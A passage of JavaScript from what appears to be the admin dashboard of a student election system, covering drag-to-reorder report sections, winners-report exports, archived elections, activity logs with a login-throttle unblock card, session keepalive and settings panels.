// Press-hold-drag vertical row reordering. Pointer events (not HTML5 DnD)
// so it works identically for mouse and touch. The grabbed row "lifts"
// (scale + shadow) and follows the pointer via transform while the other
// rows make room with a FLIP animation. Placement is DIRECT: the target
// slot is computed from how many rows sit above the pointer, so one
// decisive drag takes a row all the way to the top or bottom — no
// one-row-per-event lag. On release the row settles into its slot with a
// small landing bounce before the commit re-render.
// `listEl` must be a container whose children ARE the rows (div list or
// tbody); rows carry data-idx for the commit callback.
function attachRowDrag(handle, row, listEl, onCommit){
    handle.addEventListener('pointerdown', (e) => {
        e.preventDefault();
        // Pointer capture can fail outright, or be silently dropped
        // mid-drag — and when it is, the release never reaches the
        // handle's listeners: the row stays stuck in grab mode and keeps
        // following the mouse ("flies up infinitely"). So the drop is
        // caught at THREE levels and runs exactly once.
        try { handle.setPointerCapture(e.pointerId); } catch (err) { /* window listeners below still catch the release */ }
        const startY = e.clientY;
        const grabOffsetY = e.clientY - row.getBoundingClientRect().top;
        row.classList.add('row-dragging');
        let currentDy = 0;
        let moved = false;
        let ended = false;
        // The row's layout top changes every time it is re-slotted; the
        // transform compensates so the row stays glued to the pointer.
        const followPointer = (ev) => {
            const layoutTop = row.getBoundingClientRect().top - currentDy;
            currentDy = (ev.clientY - grabOffsetY) - layoutTop;
            row.style.transform = `translateY(${currentDy}px) scale(1.02)`;
        };
        const onMove = (ev) => {
            if (ended) return;
            // Universal stale-drag guard: if any pointermove arrives with
            // no button pressed, the release was missed somewhere (outside
            // the viewport, capture already gone) — drop NOW. While the
            // button IS held, this is false on every event.
            if (ev.buttons === 0) { onUp(); return; }
            if (Math.abs(ev.clientY - startY) > 2) moved = true;
            const allRows = Array.from(listEl.children);
            const others = allRows.filter(r => r !== row);
            // Target slot = how many other rows sit ABOVE the pointer,
            // measured in LAYOUT space (offsetTop), not getBoundingClientRect:
            // rects are mid-FLIP-animation while displaced rows glide, and
            // reading them made the target oscillate during the gesture.
            // offsetTop is transform- and transition-independent. Rows and
            // the list share an offsetParent (div child of a static div;
            // tr and tbody both anchored to the table), so the difference
            // is each row's position within the list.
            const listTop = listEl.offsetTop;
            // pointer position in list-layout space (the list itself is
            // never transformed, so its rect anchors offset-space to the
            // viewport).
            const pointerInList = ev.clientY - listEl.getBoundingClientRect().top;
            let target = 0;
            for (const other of others) {
                if (pointerInList > other.offsetTop - listTop + other.offsetHeight / 2) target++;
                else break;
            }
            const currentIdx = allRows.indexOf(row);
            if (currentIdx !== target) {
                const beforeTops = new Map(allRows.map(r => [r, r.getBoundingClientRect().top]));
                if (target >= others.length) listEl.appendChild(row);
                else listEl.insertBefore(row, others[target]);
                // FLIP: displaced rows glide to their new spots instead of
                // snapping into place.
                allRows.forEach(r => {
                    if (r === row) return;
                    const delta = beforeTops.get(r) - r.getBoundingClientRect().top;
                    if (!delta) return;
                    r.style.transition = 'none';
                    r.style.transform = `translateY(${delta}px)`;
                    requestAnimationFrame(() => {
                        r.style.transition = 'transform 0.18s ease';
                        r.style.transform = '';
                    });
                });
            }
            followPointer(ev);
        };
        const onUp = () => {
            if (ended) return;
            ended = true;
            window.removeEventListener('pointermove', onMove, true);
            handle.removeEventListener('pointerup', onUp);
            handle.removeEventListener('pointercancel', onUp);
            window.removeEventListener('pointerup', onUp, true);
            window.removeEventListener('pointercancel', onUp, true);
            window.removeEventListener('blur', onUp);
            row.classList.remove('row-dragging');
            // Put-down: glide into the slot with a soft landing bounce, THEN
            // commit — the re-render must not cut the settle animation off.
            row.style.transition = 'transform 0.2s cubic-bezier(.3,1.6,.5,1)';
            row.style.transform = '';
            row.classList.add('row-settle');
            setTimeout(() => {
                row.style.transition = '';
                row.classList.remove('row-settle');
                if (moved) onCommit();
            }, 220);
        };
        // Move tracking lives at WINDOW level, not on the handle: pointer
        // capture can die mid-gesture (e.g. when the row is re-slotted),
        // and handle-bound tracking then stops — a long drag only advanced
        // one slot per grab. Window-level capture-phase tracking follows
        // the pointer no matter what happens to the handle or the DOM.
        window.addEventListener('pointermove', onMove, true);
        handle.addEventListener('pointerup', onUp);
        handle.addEventListener('pointercancel', onUp);
        // NOTE: lostpointercapture is deliberately NOT a drop signal. Chrome
        // fires it the instant the captured row is re-slotted (insertBefore
        // momentarily detaches it) while the button is still held — treating
        // it as a drop ended every drag after the first reorder. A held
        // drag must survive capture loss; genuinely stale drags are killed
        // by the buttons-check in onMove instead.
        // Fallbacks for a release the capture didn't route to the handle
        // (released outside the viewport, capture dropped silently): any
        // pointerup/pointercancel anywhere still ends the drag.
        window.addEventListener('pointerup', onUp, true);
        window.addEventListener('pointercancel', onUp, true);
        // Safety net: focus loss (alt-tab, notification steals the pointer)
        // ends the drag — the pointer state can no longer be tracked.
        window.addEventListener('blur', onUp);
    });
}

async function generateReport(){
    const previewArea = document.getElementById('reportPreviewArea');
    previewArea.innerHTML = '<div class="skeleton skel-card" style="height:160px;"></div>';

    const schoolYear = schoolYearOptions.find(sy => String(sy.id) === String(reportTargetSchoolYearId));
    const res = await fetch(ELECTIONS_API);
    const allElections = await res.json();
    const matching = allElections.filter(e => e.type === reportType && String(e.target_school_year_id) === String(reportTargetSchoolYearId));

    if (!matching.length) {
        previewArea.innerHTML = '<div class="alert alert-warning">Nothing to report — no matching elections.</div>';
        return;
    }

    const anyUnfinished = matching.some(e => !['closed', 'archived'].includes(e.status));

    try {
        const details = await Promise.all(matching.map(e => fetch(`${ELECTIONS_API}?id=${e.id}`).then(r => r.json())));
        const sections = buildReportSections(details);
        lastReportData = {
            type: reportType,
            schoolYearLabel: schoolYear ? schoolYear.label : '',
            sections,
            // Export selection/reordering: `order` holds original section
            // indexes in display order, `selected` a boolean per index.
            // Every consumer (preview, print, PDF, XLSX, DOC) reads the
            // same filtered+ordered list via reportSectionsForExport().
            order: sections.map((_, i) => i),
            selected: sections.map(() => true),
            anyUnfinished,
        };
        renderReportPreview();
    } catch (e) {
        previewArea.innerHTML = '<div class="alert alert-error">Could not generate the report.</div>';
    }
}

function renderReportPreview(){
    const previewArea = document.getElementById('reportPreviewArea');
    if (!lastReportData) return;
    const { type, schoolYearLabel, anyUnfinished } = lastReportData;
    const sections = reportSectionsForExport();

    const anyTies = sections.some(s => s.positions.some(p => p.tie));
    const totalWinners = sections.reduce((a, s) => a + s.positions.reduce((b, p) => b + p.winners.length, 0), 0);

    // Per-section picker: select-all / pick individual sections, reorder by
    // drag or arrows. Starts fully selected so a freshly generated report
    // matches the old all-sections behavior.
    const allSelected = lastReportData.selected.length > 0 && lastReportData.selected.every(Boolean);
    const sectionPicker = `
        <div class="report-section-picker" style="margin:1rem 0 1.25rem;">
            <label style="display:inline-flex;align-items:center;gap:.4rem;font-weight:600;font-size:.85rem;">
                <input type="checkbox" id="reportSelectAll" ${allSelected ? 'checked' : ''} onchange="toggleAllReportSections(this.checked)">
                Select all sections
            </label>
            <div id="reportSectionList" style="margin-top:.6rem;">
            ${lastReportData.order.map(i => `
                <div class="report-section-row" data-idx="${i}">
                    <span class="drag-handle" title="Hold and drag to reorder">⠿</span>
                    <button type="button" class="btn btn-secondary btn-sm" title="Move up" ${lastReportData.order.indexOf(i) === 0 ? 'disabled' : ''} onclick="moveReportSection(${i}, -1)" style="padding:0 .5rem;">↑</button>
                    <button type="button" class="btn btn-secondary btn-sm" title="Move down" ${lastReportData.order.indexOf(i) === lastReportData.order.length - 1 ? 'disabled' : ''} onclick="moveReportSection(${i}, 1)" style="padding:0 .5rem;">↓</button>
                    <input type="checkbox" ${lastReportData.selected[i] ? 'checked' : ''} onchange="toggleReportSection(${i}, this.checked)">
                    <span style="flex:1;min-width:0;">${escapeHtml(lastReportData.sections[i].heading)}</span>
                </div>`).join('')}
            </div>
            <p class="muted" style="font-size:.76rem;margin:.5rem 0 0;">Exports include only the checked sections, in the order shown. Hold a row's ⠿ handle and drag, or use the arrows.</p>
        </div>`;

    // Colours come from CSS tokens (redefined for [data-theme="dark"]) via
    // the .report-* classes. The previous version inlined color:var(--navy),
    // and --navy is not defined in this stylesheet — it fell back to the
    // browser default, which is near-black on the dark card, so election
    // headings were invisible in dark mode.
    const sectionsHtml = sections.map(sec => `
        <div style="margin-bottom:1.5rem;">
            <h4>${escapeHtml(sec.heading)}</h4>
            ${sec.positions.map(p => `
                <div class="report-row">
                    <span class="pos">${escapeHtml(p.title)}</span>
                    <span class="who">
                        ${p.winners.length
                            ? p.winners.map(w => escapeHtml(w.name)).join(', ')
                            : `<span class="who-none">${p.noVotes ? 'No votes cast for this position' : 'No candidates on this position'}</span>`}
                        ${p.tie ? ' <span class="status-pill suspended">TIE — needs review</span>' : ''}
                    </span>
                </div>
            `).join('')}
        </div>
    `).join('');

    const bodyHtml = sections.length
        ? sectionsHtml
        : '<p class="muted" style="margin:1rem 0 0;">No sections selected — check at least one section above to include it in the report.</p>';

    previewArea.innerHTML = `
        <div class="card">
            <div class="panel-flex-header">
                <h3 style="margin:0;">${type} Winners — ${escapeHtml(schoolYearLabel)}</h3>
                <div style="display:flex;gap:.5rem;flex-wrap:wrap;">
                    <button class="btn btn-secondary btn-sm" onclick="openReportPrintPreview()">🖨 Print Preview</button>
                    <button class="btn btn-secondary btn-sm" onclick="saveReportAsPDF()">⬇ Save as PDF</button>
                    <button class="btn btn-secondary btn-sm" onclick="exportReportXLSX()">⬇ Export XLSX</button>
                    <button class="btn btn-secondary btn-sm" onclick="exportReportDoc()">⬇ Export DOC</button>
                </div>
            </div>
            <p class="muted" style="font-size:.76rem;margin:.5rem 0 0;">"Save as PDF" opens the same print view — choose <strong>Save as PDF</strong> as the destination and turn off headers/footers for a clean document.</p>
            ${sectionPicker}
            ${anyTies ? '<div class="alert alert-warning">One or more positions are tied — review flagged positions before finalizing.</div>' : ''}
            ${anyUnfinished ? '<div class="alert alert-info">One or more included elections haven\u2019t ended yet — this reflects current vote counts, not final results.</div>' : ''}
            ${bodyHtml}
        </div>
    `;
    bindReportSectionDrag();
}

/**
 * The printable / PDF / DOC document.
 *
 * This is deliberately a winners list and nothing else: no vote counts, no
 * generation timestamp, no margins-of-victory. It answers one question — who
 * won what — and every extra figure makes a circulated result document look
 * like preliminary data.
 *
 * The on-screen hint is hidden by CSS because this same markup is what gets
 * printed; showing it would repeat on every page.
 */
function reportPrintableHTML(){
    const { type, schoolYearLabel } = lastReportData;
    const sections = reportSectionsForExport();
    if (!sections.length) return null;
    const title = `${type} Winners Report — ${schoolYearLabel}`;

    const sectionsHtml = sections.map(sec => `
        <h3>${escapeHtml(sec.heading)}</h3>
        <table>
            <thead><tr>
                <th>Position</th>
                <th>Winner</th>
            </tr></thead>
            <tbody>
                ${sec.positions.map(p => `
                    <tr>
                        <td>${escapeHtml(p.title)}</td>
                        <td>${p.winners.length ? p.winners.map(w => escapeHtml(w.name)).join(', ') : (p.noVotes ? 'No votes cast for this position' : 'No candidates on this position')}${p.tie ? ' <strong>(TIE)</strong>' : ''}</td>
                    </tr>
                `).join('')}
            </tbody>
        </table>
    `).join('');

    return `<!DOCTYPE html><html><head><meta charset="UTF-8"><title>${escapeHtml(title)}</title>
    <style>
        body{font-family:Georgia,'Times New Roman',serif;color:#0f172a;padding:2rem;max-width:800px;margin:0 auto;}
        h1{font-size:1.4rem;margin-bottom:1.5rem;}
        h3{margin:1.5rem 0 .5rem;font-size:1rem;border-bottom:2px solid #0b2545;padding-bottom:.3rem;}
        table{width:100%;border-collapse:collapse;margin-bottom:.5rem;}
        th{text-align:left;border-bottom:1px solid #ccc;padding:.4rem;font-size:.85rem;}
        td{padding:.4rem;border-bottom:1px solid #eee;}
        .print-hint{display:none;}
        @media print{
            body{padding:0;}
            @page{ margin:14mm; }
            h3{break-after:avoid;page-break-after:avoid;}
            tr{break-inside:avoid;page-break-inside:avoid;}
        }
    </style></head>
    <body>
        <h1>${escapeHtml(title)}</h1>
        <p class="print-hint" style="color:#94a3b8;font-size:.75rem;">Choose "Save as PDF" as the print destination; turn off headers and footers for a clean document.</p>
        ${sectionsHtml}
    </body></html>`;
}

// Opens the printable report in a new tab. `autoPrint` is what separates
// "look at it" from "save it as a PDF" — a PDF is produced by the browser's
// own print pipeline, so the destination is the user's choice. This avoids a
// third CDN library and keeps the printed output identical to the
// preview, which a hand-rolled PDF generator would not.
function openReportPrintPreview(autoPrint){
    if (!lastReportData) return;
    const docHtml = reportPrintableHTML();
    if (!docHtml) { showToast('Select at least one section to export.', 'warning'); return; }
    const win = window.open('', '_blank');
    if (!win) { showToast('Please allow pop-ups to see the print preview.', 'warning'); return; }
    win.document.write(docHtml);
    win.document.close();
    win.focus();
    if (autoPrint !== false) {
        setTimeout(() => { try { win.print(); } catch (e) { /* user closed it */ } }, 300);
    }
}

function saveReportAsPDF(){
    if (!lastReportData) { showToast('Generate a report first.', 'warning'); return; }
    openReportPrintPreview(true);
}

// XLSX export — matches the printable document exactly: Section, Position,
// Winner, plus a note only where a tie needs resolving. No vote-count column,
// so all four outputs (screen, print, PDF, XLSX, DOC) agree.
function exportReportXLSX(){
    if (!lastReportData || typeof XLSX === 'undefined') { showToast('Export library failed to load. Please refresh and try again.', 'error'); return; }
    const { type, schoolYearLabel } = lastReportData;
    const sections = reportSectionsForExport();
    if (!sections.length) { showToast('Select at least one section to export.', 'warning'); return; }
    const rows = [['Section', 'Position', 'Winner', 'Note']];
    sections.forEach(sec => {
        sec.positions.forEach(p => {
            rows.push([
                sec.heading,
                p.title,
                p.winners.length ? p.winners.map(w => w.name).join(', ') : (p.noVotes ? 'No votes cast for this position' : 'No candidates on this position'),
                p.tie ? 'TIE — review needed' : '',
            ]);
        });
    });
    const ws = XLSX.utils.aoa_to_sheet(rows);
    // Four columns now (Section, Position, Winner, Note) — the old widths
    // were for a five-column sheet that included vote counts.
    ws['!cols'] = [{wch:34},{wch:24},{wch:32},{wch:22}];
    const wb = XLSX.utils.book_new();
    XLSX.utils.book_append_sheet(wb, ws, `${type} Winners`);
    XLSX.writeFile(wb, `${type}_winners_${schoolYearLabel.replace(/[^a-z0-9]+/gi,'_')}.xlsx`);
    showToast('XLSX exported.', 'success');
}

function exportReportDoc(){
    if (!lastReportData) return;
    const { schoolYearLabel } = lastReportData;
    if (!reportSectionsForExport().length) { showToast('Select at least one section to export.', 'warning'); return; }
    // A .doc file that's actually HTML — Word opens this natively (the
    // xmlns namespaces below are what make Word recognize it as a real
    // document rather than "unknown format"). Avoids needing a heavy
    // client-side docx-generation library for what's fundamentally a
    // simple table report.
    const html = `<html xmlns:o='urn:schemas-microsoft-com:office:office' xmlns:w='urn:schemas-microsoft-com:office:word' xmlns='http://www.w3.org/TR/REC-html40'>
    <head><meta charset="utf-8"><title>Report</title></head>
    <body>${reportPrintableHTML().replace(/^[\s\S]*<body>/, '').replace(/<\/body>[\s\S]*$/, '')}</body></html>`;
    const blob = new Blob(['\ufeff', html], {type: 'application/msword'});
    const url = URL.createObjectURL(blob);
    const a = document.createElement('a');
    a.href = url;
    a.download = `${lastReportData.type}_winners_${schoolYearLabel.replace(/[^a-z0-9]+/gi,'_')}.doc`;
    document.body.appendChild(a);
    a.click();
    a.remove();
    URL.revokeObjectURL(url);
    showToast('Word document exported.', 'success');
}

// ------------------------------------------------------------------
// ARCHIVE PANEL — ended elections the admin has explicitly archived.
// They're hidden from the main Elections list but not deleted, so
// results/history are still there if needed; unarchiving just moves
// them back to Ended.
// ------------------------------------------------------------------
let archiveSort = { field: 'end_date', dir: 'desc' };
let electionDetailsCache = {}; // populated by renderResults(), keyed by election id — lets the CSV export button reference full detail without re-embedding it as inline JSON

function sortArchived(list){
    const dir = archiveSort.dir === 'asc' ? 1 : -1;
    return [...list].sort((a, b) => {
        let av, bv;
        if (archiveSort.field === 'name') { av = a.name.toLowerCase(); bv = b.name.toLowerCase(); }
        else if (archiveSort.field === 'department') { av = (a.department || a.type || ''); bv = (b.department || b.type || ''); }
        else if (archiveSort.field === 'target_school_year') { av = a.target_school_year_id || 0; bv = b.target_school_year_id || 0; }
        else { av = new Date(a[archiveSort.field]).getTime(); bv = new Date(b[archiveSort.field]).getTime(); }
        if (av < bv) return -1 * dir;
        if (av > bv) return 1 * dir;
        return 0;
    });
}

async function renderArchive(){
    document.getElementById('panel-archive').innerHTML = `
        <div class="skeleton skel-line w40" style="height:16px;margin-bottom:1.25rem;"></div>
        ${'<div class="skeleton skel-card"></div>'.repeat(2)}
    `;
    try {
        const res = await fetch(ELECTIONS_API);
        const elections = await res.json();
        const archived = sortArchived(elections.filter(e => e.status === 'archived'));

        const sortBar = `
            <div class="students-toolbar" style="margin-bottom:1.25rem;">
                <select onchange="archiveSort.field=this.value; renderArchive();">
                    <option value="end_date" ${archiveSort.field==='end_date'?'selected':''}>Sort by: End Date</option>
                    <option value="start_date" ${archiveSort.field==='start_date'?'selected':''}>Sort by: Start Date</option>
                    <option value="name" ${archiveSort.field==='name'?'selected':''}>Sort by: Name</option>
                    <option value="department" ${archiveSort.field==='department'?'selected':''}>Sort by: Faculty/Type</option>
                    <option value="target_school_year" ${archiveSort.field==='target_school_year'?'selected':''}>Sort by: Election School Year</option>
                </select>
                <button class="btn btn-secondary btn-sm" onclick="archiveSort.dir = archiveSort.dir==='asc'?'desc':'asc'; renderArchive();">
                    ${archiveSort.dir === 'asc' ? '↑ Ascending' : '↓ Descending'}
                </button>
            </div>
        `;

        if (!archived.length) {
            document.getElementById('panel-archive').innerHTML = `
                ${sortBar}
                <div class="coming-soon"><div class="cs-icon">🗄</div><h3>Nothing archived yet</h3><p>Ended elections show up here once you archive them from the Elections tab.</p></div>
            `;
            return;
        }

        const cards = archived.map(e => `
            <div class="election-card">
                <div class="card-top-row">
                    <span class="status-large closed"><span class="status-dot"></span>Archived</span>
                    ${syBadgeHtml(e.target_school_year_label)}
                    <div class="remaining-time">${fmtDateTime(e.start_date)} – ${fmtDateTime(e.end_date)}</div>
                </div>
                <div>
                    <h2 class="election-title">${escapeHtml(e.name)}</h2>
                    <div class="election-sub">${e.type === 'SSG' ? 'Supreme Student Government' : 'Department Student Government — ' + escapeHtml(e.department || '')}</div>
                </div>
                <div class="card-actions">
                    <button class="btn btn-secondary" onclick="viewElectionResults(${e.id})">View Results</button>
                    <button class="btn btn-secondary" onclick="unarchiveElection(${e.id})">Restore</button>
                </div>
            </div>
        `).join('');

        document.getElementById('panel-archive').innerHTML = `${sortBar}<div class="election-cards">${cards}</div>`;
    } catch (e) {
        document.getElementById('panel-archive').innerHTML = '<div class="alert alert-error">Could not load the archive.</div>';
    }
}

// ------------------------------------------------------------------
// LOGS PANEL
// ------------------------------------------------------------------
function logDayLabel(createdAt){
    const d = parseServerTimestamp(createdAt);
    const today = new Date();
    const yesterday = new Date(); yesterday.setDate(today.getDate() - 1);
    const sameDay = (a,b) => a.getFullYear()===b.getFullYear() && a.getMonth()===b.getMonth() && a.getDate()===b.getDate();
    if (sameDay(d, today)) return 'Today';
    if (sameDay(d, yesterday)) return 'Yesterday';
    return d.toLocaleDateString('en-US', {weekday:'long', month:'short', day:'numeric', year:'numeric'});
}
function logTimeOnly(createdAt){
    const d = parseServerTimestamp(createdAt);
    return d.toLocaleTimeString('en-US', {hour:'numeric', minute:'2-digit'});
}
async function renderLogs(){
    // Mimics the actual shape (day header + a few log rows, repeated)
    // instead of a plain "Loading…" line, matching every other panel.
    document.getElementById('panel-logs').innerHTML = `
        <div class="logs-full" style="padding:1.25rem 1.5rem;">
            ${'<div class="skeleton skel-line w40" style="height:11px;margin:0 0 1rem;"></div>' + '<div class="skeleton skel-line" style="height:17px;"></div>'.repeat(3)}
            <div style="height:1.75rem;"></div>
            ${'<div class="skeleton skel-line w40" style="height:11px;margin:0 0 1rem;"></div>' + '<div class="skeleton skel-line" style="height:17px;"></div>'.repeat(2)}
        </div>
    `;
    try {
        const res = await fetch(`${LOGS_API}?limit=200`);
        const logs = await res.json();

        // Group into day sections so the log reads like a proper audit
        // trail (Today / Yesterday / older dates) instead of one long list.
        let html = '';
        let currentDay = null;
        logs.forEach(l => {
            const dayLabel = logDayLabel(l.created_at);
            if (dayLabel !== currentDay) {
                html += `<div class="log-day-header">${escapeHtml(dayLabel)}</div>`;
                currentDay = dayLabel;
            }
            html += `<div class="log-item"><span class="log-dot"></span><span class="log-time">${escapeHtml(logTimeOnly(l.created_at))}</span><span class="log-text">${l.admin_username ? `<strong>${escapeHtml(l.admin_username)}</strong> — ` : ''}${escapeHtml(l.action)}</span></div>`;
        });

                // Batch A3: fetch the currently-hot throttle buckets for the card
        // above the log (non-critical - a failed fetch just skips the card,
        // the activity list still renders).
        let throttleHtml = '';
        try {
            const th = await fetch(`${LOGS_API}?throttled=1`).then(r => r.json());
            if (Array.isArray(th) && th.length) throttleHtml = renderThrottleCard(th);
        } catch (e) { /* card omitted */ }

        document.getElementById('panel-logs').innerHTML = `
            ${throttleHtml}<div class="logs-full">${html || '<div class="coming-soon"><div class="cs-icon">📜</div><h3>No activity yet</h3><p>Actions admins take will show up here.</p></div>'}</div>
        `;
    } catch (e) {
        document.getElementById('panel-logs').innerHTML = '<div class="alert alert-error">Could not load activity logs.</div>';
    }
}

// Batch A3: the "Login throttle" card - buckets that hit the 8-per-5-min
// rate limit inside the current window, with one-click unblock.
const THROTTLE_LABELS = { student_login: 'Student login', admin_login: 'Admin login', vote_submit: 'Vote submission' };
function throttleLabel(identifier){
    const prefix = Object.keys(THROTTLE_LABELS).find(p => identifier.startsWith(p + ':'));
    return prefix ? THROTTLE_LABELS[prefix] : 'Other';
}
function renderThrottleCard(rows){
    const itemHtml = rows.map(r => `
        <div class="throttle-row">
            <div class="throttle-info">
                <strong>${escapeHtml(throttleLabel(r.identifier))}</strong>
                <span class="throttle-id">${escapeHtml(r.identifier)}</span>
            </div>
            <span class="throttle-count">${escapeHtml(String(r.attempts))} attempt(s)</span>
            <button class="btn btn-sm" onclick="unblockThrottle('${escapeHtml(r.identifier)}')">Unblock</button>
        </div>`).join('');
    return `<div class="throttle-card">
        <div class="throttle-head"><h3>Login throttle</h3><p>Buckets that hit the rate limit in the last 5 minutes. Unblock to let them try again immediately.</p></div>
        ${itemHtml}
    </div>`;
}
async function unblockThrottle(identifier){
    try {
        const res = await fetch(LOGS_API, {
            method: 'DELETE',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({ csrf_token: CSRF_TOKEN, identifier })
        });
        const data = await res.json();
        if (data.success) {
            showToast(`Unblocked ${identifier} - ${data.removed} attempt row(s) cleared.`, 'success');
            renderLogs();
        } else {
            showToast(data.error || 'Could not unblock that bucket.', 'error');
        }
    } catch (e) {
        showToast('Could not unblock that bucket.', 'error');
    }
}

// ------------------------------------------------------------------
// SESSION KEEPALIVE / IDLE WARNING
// Best-effort only — there's no server endpoint that reports the actual
// PHP session TTL, so this can't guarantee anything. What it does:
//   1) While the election wizard has unsaved changes, silently pings a
//      session-protected GET every 5 minutes so a long edit session
//      doesn't get logged out from under the admin mid-draft (typing
//      alone doesn't touch the server, so an idle tab is genuinely at
//      risk of PHP's session GC even while "in use").
//   2) If the admin is idle (no clicks/keystrokes/scrolling) for a
//      while, shows a dismissible banner suggesting they click to stay
//      signed in, instead of silently losing the session and finding
//      out only when the next action fails.
// ------------------------------------------------------------------
let lastActivityAt = Date.now();
['click', 'keydown', 'scroll', 'touchstart'].forEach(evt => {
    window.addEventListener(evt, () => { lastActivityAt = Date.now(); }, { passive: true });
});

let idleBannerEl = null;
function keepSessionAlive(){
    // A harmless, already-authenticated GET — just enough to touch the
    // session on the server so it doesn't expire mid-edit.
    fetch(ELECTIONS_API, { method: 'GET' }).catch(() => {});
    lastActivityAt = Date.now();
}

function dismissIdleBanner(){
    if (!idleBannerEl) return;
    idleBannerEl.remove();
    idleBannerEl = null;
}

function showIdleBanner(){
    if (idleBannerEl) return;
    idleBannerEl = document.createElement('div');
    idleBannerEl.className = 'idle-banner';
    idleBannerEl.innerHTML = `
        <span>You've been idle a while — your session may expire soon.</span>
        <button type="button" class="btn btn-primary btn-sm">Stay signed in</button>
    `;
    idleBannerEl.querySelector('button').addEventListener('click', () => {
        keepSessionAlive();
        dismissIdleBanner();
        showToast('Session refreshed.', 'success', { duration: 2500 });
    });
    document.body.appendChild(idleBannerEl);
}

const IDLE_WARNING_MS = 20 * 60 * 1000;    // warn after 20 min of no interaction
const WIZARD_KEEPALIVE_MS = 5 * 60 * 1000; // silent ping every 5 min while a draft is unsaved
let lastKeepaliveAt = Date.now();

setInterval(() => {
    if (wizardIsDirty() && Date.now() - lastKeepaliveAt > WIZARD_KEEPALIVE_MS) {
        lastKeepaliveAt = Date.now();
        keepSessionAlive();
        return; // actively editing counts as activity — no need to also nag with the idle banner
    }
    if (Date.now() - lastActivityAt > IDLE_WARNING_MS) {
        showIdleBanner();
    } else {
        dismissIdleBanner();
    }
}, 60 * 1000);

// ------------------------------------------------------------------
// SETTINGS PANEL — manage Faculty / School Year / Year Level, which used
// to be hardcoded arrays in this file. All follow the same shape: text
// fields update immediately in memory (oninput, no re-render — same fix
// as the earlier student-form bug where a re-render on every keystroke
// wiped out other fields), and an explicit Save/Delete/reorder click is
// what actually talks to the server. Renaming a faculty's CODE (the
// value actually stored on students/elections) goes through a confirm
// modal since it bulk-updates existing records — plain display-name-only
// edits and year-level renames don't need that same warning weight but
// still bulk-update transparently server-side (see api/settings.php).
// ------------------------------------------------------------------
async function renderSettings(){
    document.getElementById('panel-settings').innerHTML = `
        <div class="skeleton skel-card" style="height:260px;"></div>
        <div class="skeleton skel-card" style="height:260px;"></div>
        <div class="skeleton skel-card" style="height:200px;"></div>
    `;
    await loadSettingsData(true);
    renderSettingsContent();
}

function renderSettingsContent(){
    const deptRows = settingsData.departments.map((d, i) => `
        <div class="settings-row">
            <div class="election-logo-badge">${electionLogoHtml('DSG', d.code)}</div>
            <input type="file" id="dept_logo_input_${i}" accept="image/*" style="display:none;" onchange="handleDeptLogoUpload(event, '${escapeHtml(d.code)}')">
            <button class="btn btn-secondary btn-sm" onclick="document.getElementById('dept_logo_input_${i}').click()" title="Upload a logo for this faculty">Logo</button>
            ${d.logo ? `<button class="btn btn-danger btn-sm" onclick="clearDeptLogo('${escapeHtml(d.code)}')" title="Remove this faculty's logo">✕</button>` : ''}
            <input type="text" class="name-field" id="dept_name_${i}" value="${escapeHtml(d.name)}" maxlength="150" placeholder="Faculty name">
            <div class="reorder-btns">
                <button class="btn btn-secondary btn-sm" ${i===0?'disabled':''} onclick="moveDepartment(${i},-1)" title="Move up">↑</button>
                <button class="btn btn-secondary btn-sm" ${i===settingsData.departments.length-1?'disabled':''} onclick="moveDepartment(${i},1)" title="Move down">↓</button>
            </div>
            <button class="btn btn-secondary btn-sm" onclick="saveDepartmentRow(${i})">Save</button>
            <button class="btn btn-danger btn-sm" onclick="deleteDepartmentRow(${i})">Delete</button>
        </div>
    `).join('');

    const activeSy = schoolYearOptions.find(sy => sy.is_active) || schoolYearOptions[0];
    const schoolYearLabelHtml = activeSy
        ? `<div class="settings-row"><span class="status-pill active" title="Set automatically from today's date (June &rarr; May)">Current</span><span class="name-field" style="flex:1;">${escapeHtml(activeSy.label)}</span><span class="muted small" style="font-size:.75rem;">Current school year &mdash; set automatically from today's date.</span></div>`
        : `<div class="settings-row"><span class="muted small">No school year set yet.</span></div>`;

    const yearLevelLabelHtml = settingsData.year_levels.length
        ? `<div class="settings-row"><span class="muted small">Year levels are computed automatically from each student's start year (${escapeHtml(settingsData.year_levels.map(y => y.name).join(' · '))}).</span></div>`
        : `<div class="settings-row"><span class="muted small">No year levels configured.</span></div>`;

    document.getElementById('panel-settings').innerHTML = `
        <div class="card" style="margin-bottom:1.5rem;">
            <h2 class="section-title">Supreme Student Government (SSG)</h2>
            <p class="muted" style="margin:-0.5rem 0 1rem;font-size:.82rem;">Shown next to Supreme Student Government (SSG) elections across the site.</p>
            <div class="logo-upload-row">
                <div class="election-logo-badge">${electionLogoHtml('SSG', null)}</div>
                <div style="display:flex;gap:.5rem;flex-wrap:wrap;">
                    <input type="file" id="ssgLogoInput" accept="image/*" style="display:none;" onchange="handleSsgLogoUpload(event)">
                    <button class="btn btn-secondary btn-sm" onclick="document.getElementById('ssgLogoInput').click()">${ssgLogo ? 'Change Logo' : 'Upload Logo'}</button>
                    ${ssgLogo ? `<button class="btn btn-danger btn-sm" onclick="clearSsgLogo()">Remove</button>` : ''}
                </div>
            </div>
        </div>

        <div class="card" style="margin-bottom:1.5rem;">
            <h2 class="section-title">Faculties</h2>
            <p class="muted" style="margin:-0.5rem 0 1rem;font-size:.82rem;">Used for DSG elections and student records. Enter the complete faculty name — renaming updates every existing student and election that uses it.</p>
            ${deptRows || '<p class="settings-empty">No faculties yet — add one below.</p>'}
            <div class="settings-add-row">
                <input type="text" id="newDeptName" placeholder="Faculty name (e.g. Faculty of Information and Communications Technology)" maxlength="150" style="flex:1;min-width:260px;">
                <button class="btn btn-primary btn-sm" onclick="createDepartment()">+ Add Faculty</button>
            </div>
        </div>

        <div class="card" style="margin-bottom:1.5rem;">
            <h2 class="section-title">School Year</h2>
            <p class="muted" style="margin:-0.5rem 0 1rem;font-size:.82rem;">Set automatically from today's date (school years run June &rarr; May). Students' Year Levels are computed forward from their start year against this. Elections target the upcoming school year.</p>
            ${schoolYearLabelHtml}
        </div>

        <div class="card" style="margin-bottom:1.5rem;">
            <h2 class="section-title">Year Levels</h2>
            <p class="muted" style="margin:-0.5rem 0 1rem;font-size:.82rem;">Computed automatically per student (1st Year = start year, and so on up to 4 years). Past 4 years, a student's level is set manually via their enrollment status.</p>
            ${yearLevelLabelHtml}
        </div>
    
        <div class="card" style="margin-bottom:1.5rem;">
            <h2 class="section-title">Maintenance</h2>
            <p class="muted" style="margin:-0.5rem 0 1rem;font-size:.82rem;">One-click cleanups for tables that only grow. Each action asks for confirmation and is recorded in the activity log.</p>
